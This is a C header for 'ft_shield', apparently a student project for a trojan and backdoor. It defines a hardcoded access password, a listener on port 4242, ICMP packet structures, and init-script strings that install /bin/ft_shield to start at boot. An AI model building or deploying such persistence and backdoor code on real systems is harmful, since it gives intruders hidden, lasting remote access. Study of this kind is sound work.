#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# include <string.h>
# include <unistd.h>
# include <stdio.h>
# include <stdbool.h>
# include <stdlib.h>
# include <ctype.h>
# include <signal.h>
# include <sys/socket.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <sys/socket.h>
# include <sys/time.h>
# include <sys/select.h>
# include <netinet/ip.h>
# include <netinet/ip_icmp.h>
# include <pwd.h>
# include <arpa/inet.h>
# include <string.h>
# include <errno.h>

# define LSB "### BEGIN INIT INFO%c# Provides:          ft_shield%c# Required-Start:    $remote_fs $syslog%c# Required-Stop:     $remote_fs $syslog%c# Default-Start:     2 3 4 5%c# Default-Stop:      0 1 6%c# Short-Description: Start ft_shield daemon%c### END INIT INFO%c%c"
# define PERSISTENCE "case %c$1%c in%c  start)%c    /bin/ft_shield%c    ;;%c  *)%c    exit 1%c    ;;%cesac%cexit 0"

# define PORT 4242
# define BACKLOG 3
# define MAX_CLIENTS 3
# define PACKET_SIZE 64
# define PASSWORD "dejamehacermismierdas"

typedef struct s_troyan
{
    int                 socketfd;
    int                 bytes_read;
    int                 opc;
    char                buffer_exe[1024];
    FILE                *fd;
    FILE                *fd_dest;
    FILE                *fd_init;
    struct passwd       *pwd;
    struct sockaddr_in  target_addr;
} t_troyan;

typedef struct s_backdoor
{
    int                 socketfd;
    char                *target_ip;
    char                *payload;
    char                packet[PACKET_SIZE];
    struct sockaddr_in  target_addr;
    struct icmphdr      *icmp_hdr;
} t_backdoor;

extern volatile sig_atomic_t g_sigint_received;
extern volatile sig_atomic_t g_sigalrm_received;

/*** SERVER FUNCTIONS ***/
int         ft_payload(t_troyan *shield);
int         ft_persistence(t_troyan *shield);
int         init_servsocket(t_troyan *shield);
int         loop_server(t_troyan *shield);
void        ft_connection(t_troyan *shield, int socket_client);
void        init_signal();
void        sigalrm_handler(int signum);
void        sigint_handler(int signum);

/*** CLIENT FUNCTIONS ***/
int         socket_creation(t_backdoor *backdoor);
void        icmp_creation(t_backdoor *backdoor);
uint16_t    calculate_checksum(void *packet, size_t len);

#endif